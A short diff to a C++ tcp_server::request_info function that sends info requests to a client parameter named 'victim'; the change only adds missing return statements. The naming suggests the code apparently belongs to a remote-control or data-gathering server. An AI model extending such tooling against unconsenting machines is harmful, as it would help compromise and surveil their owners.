@@ -21,6 +21,7 @@ bool tcp_server::request_info(client& victim, bool request)
 			console << "Send Request(" << keyval.first << ") -> " << format_error(tcp_server::send(victim, keyval.first, "Info Request")).code << "\n";
 		}
 
+		return true;
 	}
 
 	// Fetching the values
@@ -63,5 +64,9 @@ bool tcp_server::request_info(client& victim, bool request)
 				}
 			}
 		}
+
+		return false;
+
 	}
+
 }
